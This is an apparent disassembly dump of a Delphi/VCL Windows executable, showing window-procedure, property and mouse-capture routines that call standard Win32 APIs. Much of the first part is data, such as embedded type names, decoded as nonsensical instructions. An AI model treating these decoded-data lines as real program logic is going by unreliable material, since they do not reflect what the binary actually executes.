inc eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
adc [ eax ] al
push eax
outsd
jae r-xdata
outsb
insb
pop es
inc edx
outsd
outsd
insb
popad
outsb
add [ ecx + edx ] al
inc eax
add [ ebp + ebx * 2 + 0x41 ] ah
push esp
push eax
outsd
imul ebp [ esi + 0x74 ] 0x61480701
dec ebp
popad
js r-xdata
or [ ebp + 0x61 ] ecx
jbe r-xdata
lea eax [ eax ]
sbb al 0xa2
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x6bffbb5e ] ch
movsb [ edi ] [ esi ]
inc esp
add [ eax ] al
jbe r-xdata
add al 0x8
push es
add [ esi + 0x5c0044a4 ] al
add [ eax ] eax
outsb
je r-xdata
push ebx
outsb
jb r-xdata
pop es
dec ecx
outsb
je r-xdata
pop es
inc edx
outsd
outsd
insb
popad
outsb
add [ ecx + edx ] al
inc eax
add [ ebp + ebx * 2 + 0x41 ] ah
add [ eax ] al
add [ eax ] al
add [ eax ] al
adc [ eax ] al
js r-xdata
add [ edi ] eax
dec eax
popad
outsb
insb
push esp
push eax
outsd
imul ebp [ esi + 0x74 ] 0x61480701
push 0x65
je r-xdata
imul esp [ gs : edi + 0x68 ] 0x6e490774
add [ 0x66696853 ] al
je r-xdata
push esp
dec edi
add ecx [ eax ]
push es
push ebx
outsb
jb r-xdata
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x5 ] si
push ebx
push 0xb746669
jb r-xdata
dec ebp
outsd
jne r-xdata
adc [ eax ] cl
push esp
push ebx
push 0x53746669
je r-xdata
dec ebp
outsd
jne r-xdata
je r-xdata
adc [ eax ] cl
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + edx + 0x8 ] si
add [ edx + ebx * 8 + 0x9c00044 ] cl
inc ebp
add [ eax - 0xbffbb03 ] bh
xchg edx eax
inc ecx
add [ eax - 0x7bffbaf7 ] cl
fld [ eax + eax - 0x10 ]
fadd [ eax + eax - 0x64 ]
out 0x44 al
add [ edx ] al
inc edx
add ah ch
push eax
outsd
jae r-xdata
add [ edi ] eax
dec eax
popad
outsb
insb
pop es
inc edx
push esp
push eax
outsd
imul ebp [ esi + 0x74 ] 0x61480701
sub_44a450
inc esp
add [ eax - 0x3fffbb25 ] al
fadd [ eax + eax - 0x30 ]
fadd [ eax + eax + 0x58 ]
fild [ eax + eax - 0x5c ]
jmp r-xdata
inc ebx
outsd
outsb
je r-xdata
add [ eax ] al
add [ eax - 0x80000000 ] al
add eax 0x65480600
outsd
insb
jae r-xdata
[ edx ]
jae r-xdata
and al 0xe0
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4c040002 ] al
je r-xdata
add [ eax + edx ] bh
inc eax
add [ eax ] al
add bh bh
xor eax 0x32b40040
inc eax
add al dl
xor al [ eax ]
fsub [ edx ]
inc edx
add [ ebp + ecx + 0x230c0045 ] ch
outsd
outsb
je r-xdata
inc esp
add [ eax ] ch
or [ ebp ] eax
add [ eax ] al
add [ eax ] al
or al [ eax ]
or ecx [ eax + 0x65 ]
insb
jo r-xdata
add bh bh
sbb al 0xe2
jb r-xdata
push r-xdata
adc [ eax ] al
inc esp
add [ eax ] al
dec [ eax - 0x20 ]
inc esp
add [ ebx ] ah
inc edx
add [ eax + 0x23 ] bh
inc edx
add [ edi + edx * 8 ] al
inc esp
add [ edi + ebp * 4 ] bl
inc ebp
add [ eax - 0x29 ] bh
js r-xdata
add [ eax ] al
add [ ebx ] 0x0
add edx [ edi + ebp * 2 + 0x70 ]
cmp al 0x10
inc eax
add [ eax ] cl
add bh bh
jo r-xdata
adc [ eax ] al
add [ eax ] 0x0
inc [ eax + 0x8ff0000 ]
or [ ebp ] eax
add [ eax ] al
add [ eax - 0x80000000 ] al
pop es
add [ eax + ecx * 2 ] al
imul ebp [ esi + 0x74 ] r-xdata
push eax
add [ eax ] eax
call [ eax + 0x1 ]
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax + 0x1 ] al
or [ eax ] al
or [ eax + 0x65 ] cl
insb
jo r-xdata
imul esp [ edi + 0x68 ] 0x44919074
dec esp
add [ eax ] al
call [ eax + 0x10044 ]
add [ eax ] al
adc [ eax ] al
dec eax
add [ eax ] al
push [ eax - 0x20 ]
je r-xdata
outsd
insb
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
dec esp
imul ebp [ esi + 0x6b ] 0xa6c4c08b
inc esp
add [ ebx ] al
or [ ecx + ecx * 2 + 0x6d ] dl
dec ebp
outsd
add [ gs : eax ] eax
add [ eax ] al
add [ ebx ] cl
add [ eax ] al
add al al
cmpsb [ esi ] [ edi ]
inc esp
js r-xdata
inc edx
add [ eax ] bl
fadd [ eax + eax + 0x40 ]
and eax [ edx ]
sub al 0xa6
inc esp
dec eax
loopne r-xdata
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x57050004 ] al
imul esp [ esp + esi * 2 + 0x68 ] r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
jns r-xdata
insb
inc ebx
jne r-xdata
or [ ecx + 0x6d ] ebp
inc ebx
push 0x73656e69
or ch [ gs : ecx + 0x6d ]
add [ esp + edx * 2 ] ecx
or [ ecx + 0x6d ] ch
push ebx
inc ecx
insb
jo r-xdata
or eax 0x230c0045
inc esp
add [ edi + ebp * 4 + 0x45 ] al
add al dl
or eax 0xd8f00045
inc esp
add [ edi + edx * 8 - 0x506bffbc ] ch
inc ebp
add [ eax - 0x1bffba51 ] ch
xlat
inc esp
add al dl
scasd [ edi ]
inc ebp
add [ eax - 0x28 ] al
inc esp
add al bl
scasd [ edi ]
inc ebp
add [ eax - 0x28 ] ah
inc esp
add al ah
scasd [ edi ]
inc ebp
add al bl
or eax 0xd9540045
inc esp
add [ ecx + ebx * 8 - 0x277fffbc ] dl
inc esp
add ah dh
scasd [ edi ]
inc ebp
add al bh
scasd [ edi ]
inc ebp
add [ eax + ebx * 8 - 0x29ebffbc ] ah
inc esp
add [ 0x6e695754 ] dl
inc ebx
outsd
outsb
je r-xdata
add [ eax ] bh
add bh bh
shr dl 0x44
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
push es
add [ esi ] al
inc ebx
jne r-xdata
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x48060005 ] al
imul esp [ gs : edi + 0x68 ] 0x44919074
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x54030003 ] al
outsd
jo r-xdata
inc eax
add [ ebp + esi + 0x40 ] bl
add [ eax + 0x35 ] ah
inc eax
add [ ebp + esi + 0x40 ] dl
add [ eax + eax ] ah
add [ eax ] al
mov [ esi + 0x354c0044 ] dl
inc eax
add [ eax + 0x35 ] bl
xchg esp eax
adc [ eax ] al
push esp
add [ eax ] eax
push [ eax ]
loop r-xdata
or [ ebx + 0x6f ] al
outsb
je r-xdata
add [ eax ] eax
add [ eax ] al
add [ ebx ] al
add [ eax ] al
add [ edi + 0x44 ] bh
dec esp
outsd
ja r-xdata
or [ edx + 0x76 ] esp
insb
or [ ecx + 0x6d ] ebp
dec eax
popad
outsb
jne r-xdata
insb
inc ebp
add [ gs : bx + si ] eax
add [ eax ] al
add [ ebx ] al
jb r-xdata
je r-xdata
popad
pop es
imul ebp [ ebp + 0x41 ] 0x6168706c
push es
imul ebp [ ebp + 0x48 ] 0x7617269
imul ebp [ ebp + 0x53 ] 0x6174614b
push es
imul ebp [ ebp + 0x4b ] 0x9617461
imul ebp [ ebp + 0x43 ] 0x656e6968
jae r-xdata
add [ eax ] al
add [ eax ] ch
or [ ebp ] eax
add [ eax ] al
add [ eax - 0x80000000 ] al
or [ eax ] eax
or ecx [ eax + 0x65 ]
insb
jo r-xdata
add [ eax ] al
outsd
insb
jae r-xdata
add [ esi ] al
jb r-xdata
or [ edx + 0x76 ] ah
insb
or [ ebx + 0x6f ] al
outsb
je r-xdata
pop es
bound esp [ ebp + 0x54 ]
outsd
jo r-xdata
cmpsd [ esi ] [ edi ]
inc esp
add [ ebx ] al
or dl [ edx + eax * 2 + 0x65 ]
jbe r-xdata
imul esp [ esp + esi * 2 + 0x68 ] 0x5
add bh bh
add [ eax ] al
add ah al
cmpsd [ esi ] [ edi ]
inc esp
add [ esi ] al
bound esp [ ebp + 0x4c ]
je r-xdata
add eax 0x0
add [ esi ] al
bound esi [ esi + 0x4e ]
outsd
outsb
or [ gs : edx + 0x76 ] esp
cmpsd [ esi ] [ edi ]
inc esp
push ebx
dec eax
popad
outsb
jne r-xdata
or ch [ ecx + 0x6d ]
add [ eax + 0x240044a6 ] ch
add [ eax ] al
add [ eax + 0x4c004496 ] cl
xor eax 0x35580040
jns r-xdata
jae r-xdata
test al 0x44
add [ eax ] al
insb
inc ebp
or edx [ edx + eax * 2 + 0x65 ]
jbe r-xdata
push edx
popad
imul esi [ ebx + 0x65 ] 0x76620764
push ebx
jo r-xdata
or [ fs : edx + 0x76 ] ah
add esp eax
arpl [ ebp + 0x8 ] sp
inc ebx
outsd
outsb
je r-xdata
outsd
insb
jae r-xdata
add bh bh
imul esp [ esp + esi * 2 + 0x68 ] 0x105
outsd
insd
inc edx
outsd
je r-xdata
or [ edx + 0x65 ] ah
bound esp [ ebp + 0x52 ]
imul esp [ edi + 0x68 ] 0x65620874
add [ ebx ] al
add [ eax ] al
add [ eax ] ah
test al 0x44
add [ esi ] al
bound ebp [ ebx + 0x4e ]
outsd
outsb
push es
bound ebp [ ebx + 0x54 ]
imul ebp [ ebp + 0x6 ] 0x6f536b62
je r-xdata
inc ebp
add [ ebx ] cl
outsd
jb r-xdata
cmpsd [ esi ] [ edi ]
inc esp
add [ ebx + 0x44a824c0 ] cl
add [ ebx ] al
or dl [ edx + eax * 2 + 0x65 ]
jbe r-xdata
les esp [ edi - 0x3f74ffbc ]
and al 0xa8
inc esp
jb r-xdata
insb
dec ebx
imul ebp [ esi + 0x64 ] 0x1
add [ eax ] al
outsd
insb
jae r-xdata
add [ ecx ] cl
imul ebp [ ebp + 0x44 ] 0x62617369
insb
pop es
imul ebp [ ebp + 0x43 ] 0x65736f6c
push es
imul ebp [ ebp + 0x4f ] 0xa6e6570
imul ebp [ ebp + 0x44 ] 0x43746e6f
popad
jb r-xdata
inc edx
outsd
jb r-xdata
rcl [ edi + 0x44 ] 0x0
or [ ebx + 0x6f ] al
bound ebp [ ebx + 0x46 ]
insb
popad
je r-xdata
add [ edx + esi + 0x32d00040 ] dh
inc eax
add al bl
and al [ edx ]
lodsb [ esi ]
inc eax
jl r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al cl
test eax 0xac6c0044
adc [ eax ] eax
add [ ecx - 0x3 ] edi
sbb [ esi + 0x11d1c281 ] eax
stosb [ edi ]
pushad
add al al
dec edi
mov [ 0x4308e870 ] eax
outsd
outsb
je r-xdata
or cl [ eax ]
push esp
dec ecx
insd
dec esi
popad
insd
mov eax eax
cmpsd [ fs : esi ] [ edi ]
inc esp
add [ ecx ] al
or al 0x54
enter 0x44a7 0x0
add ecx [ edx ]
push esp
inc edx
jbe r-xdata
test eax 0xac5a0044
outsd
insb
jae r-xdata
mov eax eax
push 0x10044a8
outsb
je r-xdata
inc ebx
outsd
xor eax 0x35540040
inc ecx
add [ eax + 0x1 ] bl
add ah ch
push ds
inc edx
add ah ah
push ds
inc edx
add [ edx ] cl
inc edx
add al ah
or eax 0x56e00045
inc ebp
add ah bh
pop ebx
inc ebp
add [ eax + 0x5b ] cl
inc ebp
add al bh
fild [ eax + eax + 0x5c ]
push ecx
inc ebp
add [ ecx + edx * 2 + 0x45 ] bh
add [ esi + ecx * 2 - 0x24bfffbb ] dl
inc esp
add [ ebx + ebx * 8 + 0x44 ] al
add [ eax + 0xb ] bl
inc ebp
add [ ebx + ecx - 0x197bffbb ] al
inc esp
add [ esp + ebx * 8 - 0x17efffbc ] bh
inc esp
add [ eax - 0x63ffbb19 ] cl
0xe9480044 0x44
outsd
insb
jae r-xdata
or edx [ edx + eax * 2 + 0x65 ]
jbe r-xdata
shr [ eax - 0x58 ] 0x44
add [ ecx ] al
inc esp
add [ edx + eax ] al
add [ eax ] al
shl [ ecx + 0x21ec0044 ] 0x1
inc edx
add [ eax + 0x35 ] bl
inc eax
add [ eax + 0x1b ] al
inc edx
add [ eax + 0x35 ] ah
inc eax
add [ esp + ebp ] ch
inc ebp
add [ edx + esi + 0x32d00040 ] dh
inc eax
add [ edi + ecx ] al
inc ebp
add ah cl
pop ebx
inc ebp
add ah dh
and eax [ ebp ]
hlt
pop edx
lodsb [ esi ]
insb
push edi
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add dl ah
add [ eax ] al
add [ eax ] al
enter 0x44a9 0x0
insb
lodsb [ esi ]
add bh bh
inc [ eax ]
test eax 0x44
add [ eax ] al
sub_44ae05
xchg edx eax
inc ecx
add [ eax - 0x7bffbaf7 ] cl
fld [ eax + eax - 0x58 ]
adc [ ebp ] al
pushfd
out 0x44 al
add [ edx ] al
inc edx
add ah ch
push ds
inc edx
add ah ah
push ds
inc edx
add [ edx ] cl
inc edx
add [ ebp + ebp * 2 + 0x45 ] bh
add al ah
push esi
inc ebp
add ah bh
pop ebx
inc ebp
add [ eax + 0x5b ] cl
inc ebp
add al bh
fild [ eax + eax + 0x5c ]
push ecx
inc ebp
add [ ecx + edx * 2 + 0x45 ] bh
add [ esi + ecx * 2 - 0x24bfffbb ] dl
inc esp
add [ ebx + ebx * 8 + 0x44 ] al
add [ eax + 0xb ] bl
inc ebp
add [ ebx + ecx - 0x197bffbb ] al
inc esp
add [ esp + ebx * 8 - 0x17efffbc ] bh
inc esp
add [ eax - 0x63ffbb19 ] cl
0xe9480044 0x44
sub_44af61
xchg edx eax
inc ecx
add [ eax - 0x7bffbaf7 ] cl
fld [ eax + eax - 0x58 ]
adc [ ebp ] al
pushfd
out 0x44 al
add [ edx ] al
inc edx
add ah ch
push ds
inc edx
add ah ah
push ds
inc edx
add [ edx ] cl
inc edx
add [ esp + 0x45 ] al
add al ah
push esi
inc ebp
add ah bh
pop ebx
inc ebp
add [ eax + 0x5b ] cl
inc ebp
add al bh
fild [ eax + eax + 0x5c ]
push ecx
inc ebp
add [ ecx + edx * 2 + 0x45 ] bh
add [ esi + ecx * 2 - 0x24bfffbb ] dl
inc esp
add [ ebx + ebx * 8 + 0x44 ] al
add [ eax + 0xb ] bl
inc ebp
add [ ebx + ecx - 0x197bffbb ] al
inc esp
add [ esp + ebx * 8 - 0x17efffbc ] bh
inc esp
add [ eax - 0x63ffbb19 ] cl
0xe9480044 0x44
sub_44b08c
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
sub al 0xb1
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] bl
mov cl 0x44
add [ eax + eax ] bh
add [ eax ] bl
mov eax 0x21ec0045
inc edx
add [ eax + 0x35 ] bl
inc eax
add [ eax + 0x1b ] al
inc edx
add [ eax + 0x35 ] ah
inc eax
add [ ebp + esi + 0x40 ] dl
add [ edx + esi + 0x32d00040 ] dh
inc eax
add al dl
mov ecx 0xc4200045
inc ebp
add [ eax + 0x600045c7 ] ch
retn
sub_44b0de
inc ebp
add ah cl
push ds
inc edx
add [ eax - 0x23ffbde3 ] bl
push ds
inc edx
add ah dl
pop ds
inc edx
add [ edx ] al
inc edx
add ah ch
push ds
inc edx
add ah ah
push ds
inc edx
add [ edx ] cl
inc edx
add [ eax ] dh
mov ecx 0xbf540045
inc ebp
add [ eax + 0x6a ] ch
inc ebp
add [ esp + ecx * 8 + 0x45 ] bl
add al ch
int3
sub_44b158
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov al [ 0x280044b1 ]
add [ eax ] al
add [ eax + 0x4c004010 ] dh
xor eax 0x35580040
inc eax
add [ ebp + esi + 0x40 ] bl
add [ eax + 0x35 ] ah
inc eax
add [ ebp + esi + 0x40 ] dl
add [ edx + esi + 0x32d00040 ] dh
inc eax
add [ ebx + esi ] cl
inc eax
add [ ecx ] cl
push esp
inc esp
outsd
arpl [ ebx + 0x5a ] bp
outsd
outsb
mov eax eax
int3
sub_44b248
sub [ edx - 0x4dcdffbc ] dh
inc esp
add [ edx + esi * 4 ] bh
inc esp
add [ ebp - 0x4affbb4f ] ch
mov cl 0x44
add [ ebp - 0x3affbb4f ] bh
mov cl 0x44
add dl dl
mov cl 0x44
add bh bl
mov cl 0x44
add ah ch
mov cl 0x44
add cl bh
mov cl 0x44
add [ esi ] al
mov dl 0x44
add [ ebx ] dl
mov dl 0x44
add [ eax ] ah
mov dl 0x44
add [ ecx ] al
add [ eax ] al
add [ ecx - 0x3 ] bh
sbb [ esi + 0x11d1c281 ] eax
stosb [ edi ]
pushad
add al al
dec edi
mov [ 0xffffffffb248e870 ] eax
inc esp
add [ eax + eax ] dh
add [ eax ] al
add [ eax ] al
add ah ch
mov dl 0x44
add [ eax + 0x44b2 ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] bl
mov bl 0x44
add [ eax ] bh
add [ eax ] al
movsb [ edi ] [ esi ]
adc [ eax ] eax
dec esp
xor eax 0x5b380040
inc eax
add [ ebx + ebx * 2 + 0x40 ] al
add [ eax + 0x35 ] ah
inc eax
add [ ebp + esi + 0x40 ] dl
add [ eax ] al
int3
mov eax eax
jo r-xdata
add [ ebx + ebx * 2 + 0x40 ] dl
add al dl
xor al [ eax ]
fdiv [ esi + 0x45 ]
add [ edi + esi * 2 ] ch
inc ebp
add [ eax + edi * 2 + 0x78b40045 ] ah
inc ebp
add [ eax + eax * 4 + 0x45 ] dh
add [ ebx + eax * 4 + 0x45 ] bl
add [ ebp + eax * 4 - 0x785fffbb ] bl
inc ebp
add [ esp + ecx * 4 - 0x75a7ffbb ] ah
inc ebp
add [ eax + 0x75 ] dh
inc ebp
add [ eax ] bh
test [ ebp ] al
or [ esp + eax * 2 + 0x6f ] edx
arpl [ ebx + 0x54 ] bp
jb r-xdata
xor eax 0x35540040
inc eax
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x4d ] dh
inc esp
add [ eax ] ch
add [ eax ] al
add [ eax + 0x4c004010 ] dh
xor eax 0x35580040
inc eax
add [ ebp + esi + 0x40 ] bl
add [ eax + 0x35 ] ah
inc eax
add [ ebp + esi + 0x40 ] dl
add [ edx + esi + 0x32d00040 ] dh
inc eax
add [ ecx + ebx * 4 + 0x54060045 ] cl
dec ebp
outsd
jne r-xdata
push ds
inc edx
add [ edx ] cl
inc edx
add al ah
or eax 0x56e00045
inc ebp
add ah bh
pop ebx
inc ebp
add [ eax + 0x5b ] cl
inc ebp
add al bh
fild [ eax + eax + 0x5c ]
push ecx
inc ebp
add [ ecx + edx * 2 + 0x45 ] bh
add [ esi + ecx * 2 - 0x24bfffbb ] dl
inc esp
add [ ebx + ebx * 8 + 0x44 ] al
add [ eax + 0xb ] bl
inc ebp
add [ ebx + ecx - 0x197bffbb ] al
inc esp
add [ esp + ebx * 8 - 0x17efffbc ] bh
inc esp
add [ eax - 0x63ffbb19 ] cl
0xe9480044 0x44
nop
les esi [ ebx + 0x44 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
sub_44b438
enter 0x452a 0x0
or [ eax * 2 + 0x454ee800 ] cl
add [ edi + ecx * 2 + 0x4aa00045 ] ah
inc ebp
add [ eax + 0x2000454f ] cl
adc [ ebp ] eax
mov ah 0x17
inc ebp
add [ ebp + 0x45 ] dl
add [ eax + 0x1f ] al
inc ebp
add [ edx ] bh
inc ebp
add [ eax + 0x45 ] ch
add ah ch
and eax 0x25f00045
inc ebp
add [ eax + 0x50004524 ] ch
and al 0x45
add al cl
push eax
inc ebp
add [ eax - 0x43ffbad2 ] bl
bound eax [ ebp ]
inc esp
dec ebp
inc ebp
add [ eax + edx * 2 ] dh
inc ebp
add ah ch
sub al [ eax ]
in al dx
sub al [ eax ]
in al dx
sub al [ eax ]
in al dx
sub al [ eax ]
in al dx
sub al [ eax ]
in al dx
sub al [ eax ]
in al dx
sub al [ eax ]
in al dx
sub al [ eax ]
pushfd
mov al [ 0x2aec0045 ]
inc eax
add [ edx ] dl
push esp
inc ebx
jne r-xdata
inc eax
sbb eax [ edx ]
pushad
xor eax 0x2c2c0040
je r-xdata
inc ebp
inc eax
add [ eax + 0x1b ] al
inc edx
add [ eax + 0x35 ] ah
inc eax
add [ esp + ebp ] ch
insd
dec esp
imul esi [ ebx + 0x74 ] 0x746e6f43
jb r-xdata
add [ edx + esi + 0x32d00040 ] dh
inc eax
add [ edi + ecx ] al
inc ebp
add ah cl
pop ebx
inc ebp
add ah dh
and eax [ ebp ]
hlt
sub al 0x45
insb
nop
int3
sub_44b6a8
push ebp
mov ebp esp
push ecx
push ebx
lea ebx [ ebp - 0x4 ]
mov eax [ rw-data ]
mov edx [ ebp + 0x8 ]
mov [ eax + 0x180 ] edx
mov eax [ rw-data ]
mov eax [ eax + 0x18c ]
push eax
push 0xfffffffc
mov eax [ ebp + 0x8 ]
push eax
call SetWindowLongA
push 0xfffffff0
mov eax [ ebp + 0x8 ]
push eax
call GetWindowLongA
test eax 0x40000000
je r-xdata
mov eax [ rw-data ]
push eax
movzx eax [ rw-data ]
push eax
mov eax [ ebp + 0x8 ]
push eax
call SetPropA
mov eax [ rw-data ]
push eax
movzx eax [ rw-data ]
push eax
mov eax [ ebp + 0x8 ]
push eax
call SetPropA
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov eax [ rw-data ]
mov [ rw-data ] 0x0
call [ eax + 0x18c ]
mov [ ebp - 0x4 ] eax
mov eax [ ebx ]
pop ebx
pop ecx
pop ebp
retn 0x10
push 0xfffffff4
mov eax [ ebp + 0x8 ]
push eax
call GetWindowLongA
test eax eax
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
push 0xfffffff4
mov eax [ ebp + 0x8 ]
push eax
call SetWindowLongA
sub_44b760
push ebx
push ecx
mov ebx eax
push esp
push ebx
call GetWindowThreadProcessId
test eax eax
je r-xdata
xor eax eax
pop edx
pop ebx
retn
call GetCurrentProcessId
cmp eax [ esp ]
jne r-xdata
push 0x0
push 0x0
mov eax [ rw-data ]
push eax
push ebx
call SendMessageA
pop edx
pop ebx
retn
sub_44b794
push ebx
push esi
push ecx
mov ebx eax
xor esi esi
test ebx ebx
je r-xdata
mov eax esi
pop edx
pop esi
pop ebx
retn
push esp
push ebx
call GetWindowThreadProcessId
test eax eax
je r-xdata
call GetCurrentProcessId
cmp eax [ esp ]
jne r-xdata
mov eax [ rw-data ]
call sub_4045d8
push eax
call GlobalFindAtomA
cmp ax [ rw-data ]
jne r-xdata
mov eax ebx
call sub_44b760
mov esi eax
movzx eax [ rw-data ]
push eax
push ebx
call GetPropA
mov esi eax
jmp r-xdata
sub_44b7f0
push ebx
push esi
mov ebx [ rw-data ]
mov ebx [ ebx ]
mov esi [ ebx + 0x30 ]
test esi esi
je r-xdata
xor eax eax
pop esi
pop ebx
retn
push ecx
push edx
push eax
mov eax [ rw-data ]
push esi
call SendMessageA
pop esi
pop ebx
retn
sub_44b9d4
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov edx esi
mov eax r-xdata
call sub_40ca64
mov ebx eax
test ebx ebx
jne r-xdata
push edi
mov ecx ebx
dec ecx
mov edx 0x1
mov eax esi
call sub_404638
mov eax edi
mov edx esi
call sub_40416c
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_44ba18
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov edx esi
mov eax r-xdata
call sub_40ca64
mov ebx eax
test ebx ebx
jne r-xdata
push edi
lea edx [ ebx + 0x1 ]
mov ecx 0x7fffffff
mov eax esi
call sub_404638
mov eax edi
mov edx esi
call sub_40416c
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_44ba84
push ebx
mov ebx eax
call ReleaseCapture
xor eax eax
mov [ rw-data ] eax
test ebx ebx
je r-xdata
pop ebx
retn
mov eax ebx
mov edx [ r-xdata ]
call sub_4034a8
test al al
jne r-xdata
mov eax ebx
call sub_4550b4
push eax
call SetCapture
cmp [ ebx + 0x30 ] 0x0
je r-xdata
mov [ rw-data ] ebx
mov ebx [ ebx + 0x30 ]
sub_44bb30
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
xor eax eax
mov [ ebx ] eax
xor eax eax
jmp r-xdata
mov edx [ ebx ]
cmp edx [ esi + 0x8 ]
jl r-xdata
mov edx [ ebx ]
mov eax esi
call sub_418cf8
cmp edi [ eax + 0x4 ]
sete al
test al al
jne r-xdata
pop edi
pop esi
pop ebx
retn
inc [ ebx ]
sub_44bb64
push ebp
mov ebp esp
push ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_4550b4
mov ebx eax
test eax eax
je r-xdata
mov eax ebx
pop ebx
pop ebp
retn
mov ebx eax
push eax
call GetParent
test eax eax
jne r-xdata
sub_44bb8c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] edx
mov esi eax
mov eax 0x8
call sub_4026ec
mov ebx eax
mov eax [ ebp - 0x4 ]
mov [ ebx ] eax
push ebp
call sub_44bb64
pop ecx
mov edi eax
mov [ ebx + 0x4 ] edi
lea ecx [ ebp - 0x8 ]
mov edx edi
mov eax esi
call sub_44bb30
test al al
je r-xdata
mov edx ebx
mov eax esi
call sub_418b9c
mov ecx ebx
mov edx [ ebp - 0x8 ]
mov eax esi
call sub_418d74
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_44bbe8
push ebx
push esi
push edi
mov edi eax
mov ebx [ edi + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov eax edi
call sub_418bd0
pop edi
pop esi
pop ebx
retn
inc ebx
xor esi esi
mov edx esi
mov eax edi
call sub_418cf8
mov edx 0x8
call sub_40270c
inc esi
dec ebx
jne r-xdata
sub_44bc1c
push ebx
push esi
push edi
push ecx
mov ebx eax
xor edi edi
mov eax [ ebx + 0x8 ]
test eax eax
je r-xdata
mov eax edi
pop edx
pop edi
pop esi
pop ebx
retn
dec eax
jne r-xdata
call GetDesktopWindow
push eax
call GetTopWindow
mov esi eax
jmp r-xdata
xor edx edx
mov eax ebx
call sub_418cf8
mov edi [ eax ]
jmp r-xdata
test edi edi
jne r-xdata
test esi esi
jne r-xdata
mov ecx esp
mov edx esi
mov eax ebx
call sub_44bb30
test al al
je r-xdata
push 0x2
push esi
call __imp_GetWindow
mov esi eax
mov eax [ ebx + 0x4 ]
mov edx [ esp ]
mov eax [ eax + edx * 4 ]
mov edi [ eax ]
jmp r-xdata
sub_44bc80
mov ecx [ edx + 0x4 ]
mov [ eax + 0x4 ] ecx
mov ecx [ edx + 0x8 ]
mov [ eax + 0x8 ] ecx
mov ecx [ edx + 0xc ]
mov [ eax + 0xc ] ecx
mov ecx [ edx + 0x10 ]
mov [ eax + 0x10 ] ecx
mov ecx [ edx + 0x14 ]
mov [ eax + 0x14 ] ecx
mov ecx [ edx + 0x18 ]
mov [ eax + 0x18 ] ecx
mov ecx [ edx + 0x20 ]
mov [ eax + 0x20 ] ecx
mov ecx [ edx + 0x24 ]
mov [ eax + 0x24 ] ecx
mov ecx [ edx + 0x28 ]
mov [ eax + 0x28 ] ecx
mov ecx [ edx + 0x2c ]
mov [ eax + 0x2c ] ecx
retn
sub_44bce0
push ebx
push esi
add esp 0xffffff00
mov esi edx
mov ebx eax
mov edx esp
mov eax [ ebx ]
call sub_40326c
mov edx esp
mov eax esi
call sub_40437c
add esp 0x100
pop esi
pop ebx
retn
sub_44bd1c
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_44bde6
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx ]
cmp eax 0x215
jg r-xdata
sub eax 0xbd00
je r-xdata
je r-xdata
mov eax [ ebx + 0x4 ]
sub eax 0x11
je r-xdata
dec eax
je r-xdata
xor eax eax
call sub_44ce3c
jmp r-xdata
sub eax 0x200
je r-xdata
mov eax [ rw-data ]
add eax 0xc
call sub_44c7c4
jmp r-xdata
sub eax 0xa
je r-xdata
cmp [ ebx + 0x4 ] 0x11
jne r-xdata
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
lea edx [ ebp - 0xc ]
mov eax [ ebx + 0x8 ]
call sub_406e50
lea eax [ ebp - 0xc ]
push eax
mov eax [ rw-data ]
push eax
call ClientToScreen
